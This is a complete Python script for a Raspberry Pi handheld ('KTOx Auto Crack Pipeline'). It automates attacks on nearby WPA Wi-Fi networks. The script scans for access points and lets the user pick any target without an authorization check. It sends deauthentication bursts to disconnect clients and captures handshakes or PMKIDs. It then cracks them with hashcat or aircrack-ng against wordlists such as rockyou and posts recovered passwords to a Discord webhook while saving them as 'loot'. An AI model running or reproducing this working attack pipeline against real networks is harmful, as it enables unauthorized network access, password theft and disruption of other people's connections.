#!/usr/bin/env python3
"""
KTOx - Auto Crack Pipeline
===========================
Author: wickednull

Fully automated WPA handshake/PMKID capture & cracking.
- Auto-detects wlan0/wlan1, enables monitor mode
- Scans for APs with signal bars
- Choose any wordlist (browse filesystem)
- Real-time hashcat progress
- Discord notifications

Controls:
  UP/DOWN  – select target
  OK       – start attack
  KEY1     – toggle deauth burst
  KEY2     – cycle wordlist / browse
  KEY3     – exit
"""

import os
import sys
import re
import time
import subprocess
import requests
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD (KTOx standard)
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()

f9 = font(9)
f11 = font(11)

# ----------------------------------------------------------------------
# Directories & webhook
# ----------------------------------------------------------------------
LOOT_DIR = "/root/KTOx/loot/AutoCrack"
os.makedirs(LOOT_DIR, exist_ok=True)
WEBHOOK_FILE = "/root/KTOx/discord_webhook.txt"

def webhook(msg):
    try:
        with open(WEBHOOK_FILE) as f:
            url = f.read().strip()
        if url:
            requests.post(url, json={"content": f"**[KTOx AutoCrack]** {msg}"}, timeout=5)
    except:
        pass

# ----------------------------------------------------------------------
# LCD drawing helpers (KTOx dark red style)
# ----------------------------------------------------------------------
def draw(lines, title="KTOx CRACK", title_color="#8B0000", text_color="#FFBBBB"):
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill=title_color)
    d.text((4, 3), title[:20], font=f9, fill="#FF3333")
    y = 20
    for line in lines[:7]:
        d.text((4, y), line[:23], font=f9, fill=text_color)
        y += 12
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "UP/DN OK KEY1/2 K3", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_signal(draw_obj, x, y, dbm):
    length = int((dbm + 90) / 60 * 24)
    length = max(0, min(24, length))
    draw_obj.rectangle((x, y, x+length, y+6), fill="#00FF00")
    draw_obj.rectangle((x+length, y, x+24, y+6), fill="#333")
    draw_obj.text((x+26, y-1), str(dbm), font=f9, fill="#AAA")

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# File browser (KTOx themed)
# ----------------------------------------------------------------------
def browse_file(start="/", exts=[".txt"]):
    path = os.path.abspath(start)
    hist = []
    sel = 0
    scroll = 0
    rows = 8

    def list_dir(p):
        try:
            items = sorted(os.listdir(p))
            dirs = [d for d in items if os.path.isdir(os.path.join(p, d))]
            files = [f for f in items if os.path.isfile(os.path.join(p, f))]
            if exts:
                files = [f for f in files if any(f.lower().endswith(e) for e in exts)]
            return dirs + files
        except:
            return []

    def redraw(entries, s, sc, cur):
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        d.rectangle((0, 0, W, 16), fill="#8B0000")
        header = cur if len(cur) < 20 else "..." + cur[-17:]
        d.text((2, 2), header[:20], font=f9, fill="#FF9999")
        y = 20
        for i in range(rows):
            idx = sc + i
            if idx >= len(entries):
                break
            name = entries[idx]
            if len(name) > 20:
                name = name[:18] + ".."
            color = "#FFFF00" if idx == s else "#FFBBBB"
            if os.path.isdir(os.path.join(cur, name)):
                name = "/" + name
            d.text((4, y), name, font=f9, fill=color)
            y += 11
        d.rectangle((0, H-12, W, H), fill="#220000")
        d.text((2, H-10), "UP/DOWN OK K3=back", font=f9, fill="#FF7777")
        LCD.LCD_ShowImage(img, 0, 0)

    def get_btn():
        while True:
            for n, p in PINS.items():
                if GPIO.input(p) == 0:
                    time.sleep(0.05)
                    return n
            time.sleep(0.02)

    while True:
        entries = list_dir(path)
        if not entries:
            img = Image.new("RGB", (W, H), "#0A0000")
            d = ImageDraw.Draw(img)
            d.text((4, 50), "Empty folder", font=f9, fill="#FF8888")
            d.text((4, 70), "K3 to go back", font=f9, fill="#888")
            LCD.LCD_ShowImage(img, 0, 0)
            while True:
                btn = get_btn()
                if btn == "KEY3":
                    if hist:
                        path = hist.pop()
                        break
                    else:
                        return None
                time.sleep(0.05)
            continue

        redraw(entries, sel, scroll, path)
        btn = get_btn()
        if btn == "KEY3":
            if hist:
                path = hist.pop()
                sel = 0
                scroll = 0
            else:
                return None
        elif btn == "UP":
            sel = (sel - 1) % len(entries)
            if sel < scroll:
                scroll = sel
        elif btn == "DOWN":
            sel = (sel + 1) % len(entries)
            if sel >= scroll + rows:
                scroll = sel - rows + 1
        elif btn == "OK":
            selected = entries[sel]
            full = os.path.join(path, selected)
            if os.path.isdir(full):
                hist.append(path)
                path = full
                sel = 0
                scroll = 0
            else:
                return full
        time.sleep(0.05)

# ----------------------------------------------------------------------
# System helpers
# ----------------------------------------------------------------------
def run(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except:
        return ""

def get_wlan():
    for iface in ["wlan0", "wlan1"]:
        if os.path.exists(f"/sys/class/net/{iface}"):
            return iface
    return None

def enable_mon(iface):
    run("airmon-ng check kill")
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type monitor")
    run(f"ip link set {iface} up")
    mon = f"{iface}mon"
    if not os.path.exists(f"/sys/class/net/{mon}"):
        run(f"airmon-ng start {iface}")
    return mon if os.path.exists(f"/sys/class/net/{mon}") else iface

def disable_mon(iface):
    run(f"airmon-ng stop {iface}mon")
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up")
    run("systemctl restart NetworkManager")

# ----------------------------------------------------------------------
# Scan for APs (robust CSV parsing)
# ----------------------------------------------------------------------
def scan_aps(mon):
    draw(["Scanning 15 sec...", f"Interface: {mon}"])
    tmp = f"/tmp/ktox_scan_{int(time.time())}"
    proc = subprocess.Popen(
        f"airodump-ng --output-format csv -w {tmp} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(15)
    proc.terminate()
    time.sleep(1)

    csv_file = f"{tmp}-01.csv"
    if not os.path.exists(csv_file):
        return []

    with open(csv_file, errors="ignore") as f:
        lines = f.readlines()

    # Find header line
    header_idx = -1
    for i, line in enumerate(lines):
        if "BSSID" in line and "ESSID" in line:
            header_idx = i
            break
    if header_idx == -1:
        return []

    # Parse header to get column indices
    headers = [h.strip() for h in lines[header_idx].split(",")]
    try:
        col_bssid = headers.index("BSSID")
        col_ch = headers.index("channel")
        col_pwr = headers.index("PWR")
        col_essid = headers.index("ESSID")
    except ValueError:
        return []

    aps = []
    for line in lines[header_idx+1:]:
        if not line.strip() or "Station MAC" in line:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) <= max(col_bssid, col_ch, col_pwr, col_essid):
            continue
        bssid = parts[col_bssid]
        if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
            continue
        ch = parts[col_ch]
        pwr = parts[col_pwr]
        essid = parts[col_essid]
        if essid and essid != "(not associated)":
            try:
                sig = int(pwr)
            except:
                sig = -90
            aps.append((bssid, ch, essid, sig))
    # Cleanup
    for f in [csv_file, f"{tmp}-01.kismet.csv", f"{tmp}-01.kismet.netxml"]:
        try: os.remove(f)
        except: pass
    return aps

# ----------------------------------------------------------------------
# Handshake capture
# ----------------------------------------------------------------------
def capture_hs(mon, bssid, ch, essid, deauth):
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(LOOT_DIR, f"{safe}_{ts}")
    os.makedirs(out, exist_ok=True)
    cap = os.path.join(out, "capture")
    draw([f"Target: {essid[:16]}", f"CH:{ch} {bssid}", "Capturing handshake..."])
    proc = subprocess.Popen(
        f"airodump-ng -c {ch} --bssid {bssid} -w {cap} --output-format pcap {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    if deauth:
        time.sleep(5)
        draw(["Sending deauth..."])
        run(f"aireplay-ng --deauth 10 -a {bssid} {mon}")
    time.sleep(20)
    proc.terminate()
    caps = [f for f in os.listdir(out) if f.endswith(".cap")]
    if caps:
        return os.path.join(out, caps[0]), out
    return None, out

def capture_pmkid(mon, bssid, ch, essid):
    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = os.path.join(LOOT_DIR, f"pmkid_{safe}_{ts}")
    os.makedirs(out, exist_ok=True)
    pcapng = os.path.join(out, "capture.pcapng")
    draw(["PMKID capture", f"ESSID: {essid[:16]}", "Using hcxdumptool..."])
    run(f"hcxdumptool -i {mon} -o {pcapng} -c {ch} --filterlist={bssid} --filtermode=2", timeout=30)
    hashfile = os.path.join(out, "pmkid.16800")
    run(f"hcxpcaptool -z {hashfile} {pcapng}")
    if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
        return hashfile, out
    return None, out

def validate(cap):
    out = run(f"aircrack-ng {cap} 2>/dev/null")
    return "handshake" in out.lower()

# ----------------------------------------------------------------------
# Cracking
# ----------------------------------------------------------------------
def crack_hashcat(hash_file, mode, wordlist, essid):
    draw([f"Cracking with hashcat", f"Mode {mode}", "0%"], title_color="#444400")
    cmd = f"hashcat -m {mode} {hash_file} {wordlist} --force --status --status-timer=5 --potfile-disable"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    pwd = None
    try:
        for line in iter(proc.stdout.readline, ''):
            if not line:
                break
            if "STATUS" in line:
                m = re.search(r'(\d+\.?\d*)%', line)
                if m:
                    draw([f"Cracking... {m.group(1)}%", f"Wordlist: {os.path.basename(wordlist)}", "K1=stop"], title_color="#444400")
            if ":" in line and essid in line:
                parts = line.strip().split(":")
                if len(parts) >= 2:
                    pwd = parts[-1]
                    break
        proc.wait(timeout=2)
    except:
        proc.terminate()
    return pwd

def crack_aircrack(cap, wordlist):
    out = run(f"aircrack-ng -w {wordlist} {cap} 2>/dev/null", timeout=300)
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
    return m.group(1) if m else None

def crack_handshake(cap, essid, wl):
    hccapx = cap.replace(".cap", ".hccapx")
    run(f"cap2hccapx {cap} {hccapx}")
    if os.path.exists(hccapx):
        pwd = crack_hashcat(hccapx, 2500, wl, essid)
        if pwd:
            return pwd
    return crack_aircrack(cap, wl)

def crack_pmkid_file(pmkid, essid, wl):
    return crack_hashcat(pmkid, 16800, wl, essid)

# ----------------------------------------------------------------------
# Wordlist manager
# ----------------------------------------------------------------------
def get_predefined():
    cand = [
        ("rockyou", "/usr/share/wordlists/rockyou.txt"),
        ("custom", "/root/KTOx/loot/wordlists/custom.txt"),
        ("default", "/usr/share/john/password.lst"),
    ]
    return [(n, p) for n, p in cand if os.path.exists(p)]

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    iface = get_wlan()
    if not iface:
        draw(["No wireless card found", "KEY3 to exit"], text_color="#FF4444")
        while wait_btn(0.5) != "KEY3":
            pass
        return

    draw([f"Using {iface}", "Starting monitor mode..."])
    mon = enable_mon(iface)
    if not mon:
        draw(["Monitor mode failed", "KEY3 to exit"], text_color="#FF4444")
        while wait_btn(0.5) != "KEY3":
            pass
        return

    aps = scan_aps(mon)
    if not aps:
        draw(["No APs found", "Check interface & location", "KEY3 to exit"], text_color="#FF8888")
        while wait_btn(0.5) != "KEY3":
            pass
        return

    cursor = 0
    deauth = True
    pre = get_predefined()
    wl_items = pre + [("[Browse...]", None)]
    wl_idx = 0
    wl_path = pre[0][1] if pre else None
    wl_name = pre[0][0] if pre else "None"

    while True:
        bssid, ch, essid, sig = aps[cursor]
        wl_disp = wl_name if wl_idx < len(pre) else "Browse..."
        lines = [
            f"> {essid[:18]}",
            f"  {bssid}",
            f"  CH:{ch}  {sig}dBm",
            f"  {cursor+1}/{len(aps)}  WL:{wl_disp[:6]}",
            "",
            "OK=start  KEY2=WL",
            f"KEY1=deauth:{'ON' if deauth else 'OFF'}"
        ]
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        d.rectangle((0, 0, W, 17), fill="#8B0000")
        d.text((4, 3), "SELECT TARGET", font=f9, fill="#FF3333")
        y = 20
        for i, line in enumerate(lines):
            d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
            if i == 2:
                draw_signal(d, 80, y, sig)
            y += 12
        d.rectangle((0, H-12, W, H), fill="#220000")
        d.text((4, H-10), "UP/DN OK KEY1/2 K3", font=f9, fill="#FF7777")
        LCD.LCD_ShowImage(img, 0, 0)

        btn = wait_btn(0.5)
        if btn == "UP":
            cursor = (cursor - 1) % len(aps)
        elif btn == "DOWN":
            cursor = (cursor + 1) % len(aps)
        elif btn == "KEY1":
            deauth = not deauth
        elif btn == "KEY2":
            old = wl_idx
            wl_idx = (wl_idx + 1) % len(wl_items)
            if wl_items[wl_idx][1] is None:
                f = browse_file("/", [".txt"])
                if f:
                    wl_path = f
                    wl_name = os.path.basename(f)[:12]
                else:
                    wl_idx = old
            else:
                wl_path = wl_items[wl_idx][1]
                wl_name = wl_items[wl_idx][0]
        elif btn == "KEY3":
            disable_mon(iface)
            GPIO.cleanup()
            return
        elif btn == "OK":
            break
        time.sleep(0.05)

    bssid, ch, essid, sig = aps[cursor]
    if not wl_path or not os.path.exists(wl_path):
        draw(["Invalid wordlist", "KEY3 to exit"], text_color="#FF4444")
        while wait_btn(0.5) != "KEY3":
            pass
        return

    cap_file, out_dir = capture_hs(mon, bssid, ch, essid, deauth)
    is_pmkid = False
    if cap_file:
        draw(["Validating handshake..."])
        if not validate(cap_file):
            draw(["Handshake invalid", "Trying PMKID..."], text_color="#FF8800")
            webhook(f"Handshake invalid for {essid}, trying PMKID")
            pmkid, pmkid_dir = capture_pmkid(mon, bssid, ch, essid)
            if pmkid:
                cap_file = pmkid
                out_dir = pmkid_dir
                is_pmkid = True
            else:
                draw(["PMKID capture failed", "KEY3 to exit"], text_color="#FF4444")
                webhook(f"Capture failed for {essid}")
                while wait_btn(0.5) != "KEY3":
                    pass
                return
    else:
        draw(["Handshake capture failed", "KEY3 to exit"], text_color="#FF4444")
        webhook(f"Capture failed for {essid}")
        while wait_btn(0.5) != "KEY3":
            pass
        return

    webhook(f"Captured {essid} ({bssid}) – cracking with {wl_name}")
    draw(["Starting crack...", f"Wordlist: {wl_name}"])
    if is_pmkid:
        pwd = crack_pmkid_file(cap_file, essid, wl_path)
    else:
        pwd = crack_handshake(cap_file, essid, wl_path)

    if pwd:
        draw([f"SUCCESS!", f"{essid[:16]}", f"PASS: {pwd[:18]}"], title_color="#00AA00")
        webhook(f"Cracked {essid} → {pwd}")
        with open(os.path.join(out_dir, "cracked.txt"), "w") as f:
            f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {pwd}\nWordlist: {wl_name}\nDate: {datetime.now().isoformat()}\n")
    else:
        draw(["FAILED", "Not cracked", f"Saved in {os.path.basename(out_dir)}"], text_color="#FF8800")
        webhook(f"Not cracked for {essid} with {wl_name}")

    while wait_btn(0.5) != "KEY3":
        pass

    disable_mon(iface)
    GPIO.cleanup()

if __name__ == "__main__":
    main()
